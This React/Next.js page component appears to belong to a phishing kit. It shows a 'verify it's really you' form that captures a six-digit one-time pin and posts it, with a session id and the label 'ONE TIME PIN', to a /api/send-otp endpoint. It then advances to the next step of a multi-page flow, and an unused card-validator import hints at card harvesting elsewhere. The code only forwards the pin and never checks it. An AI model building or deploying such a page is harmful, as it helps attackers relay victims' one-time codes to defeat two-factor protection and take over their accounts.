import React, { useContext, useState } from "react";
import { Box, TextField, Typography } from "@mui/material";
import axios from "axios";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import ReactInputMask from "react-input-mask";
import valid from "card-validator";
import * as yup from "yup";
import { Button } from "../components/Button";
import { Wrapper } from "../components/Wrapper";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { DataContext } from "./_app";

interface EmailProps {}

const schema = yup.object().shape({
  otp: yup
    .number()
    .typeError(`One time pin not valid`)
    .required(`One time pin required`)
    .test(
      `len`,
      `One time pin required`,
      (val) => !!(val && val.toString().length === 6)
    ),
});

const Otp: React.FC<EmailProps> = ({}) => {
  const [loading, setLoading] = useState(false);
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `ONE TIME PIN`);
    formData.append(
      `otp`,
      JSON.stringify({ sessionId: datas.sessionId, ...data })
    );

    try {
      await axios.post(`/api/send-otp`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      otp: data,
    });

    const url = getProgress()[getProgress().indexOf(`OTP`) + 1];

    push(getNextUrl(url));
  });

  return (
    <Wrapper title={`Now, let's verify it's really you.`}>
      <Box component={`form`}>
      <ReactInputMask mask={"9 9 9 9 9 9"} {...register("otp")}>
          {
            // @ts-ignore
            () => (
        <TextField
          label="One Time Pin"
          variant="standard"
          fullWidth
          sx={{
            marginTop: `16px`,
          }}
          error={errors.otp && errors.otp.message}
          helperText={errors.otp && errors.otp.message}
          {...register(`otp`)}
        />
        )
      }
    </ReactInputMask>
        <Button
          variant="contained"
          sx={{
            height: `36px`,
            textIndent: `0.0892857143em`,
            letterSpacing: `.0892857143em`,
            padding: `0 16px`,
            marginRight: `12px`,
          }}
          onClick={onSubmit}
          disabled={loading}
        >
          Next
        </Button>
      </Box>
      <Typography
        component={`p`}
        sx={{
          fontSize: `.875rem`,
          fontFamily: `Roboto,sans-serif`,
          fontWeight: 400,
          lineHeight: `1.25rem`,
          letterSpacing: `.0178571429em`,
          marginTop: `24px`,
          marginBottom: `16px`,
        }}
      ></Typography>
    </Wrapper>
  );
};

export default Otp;
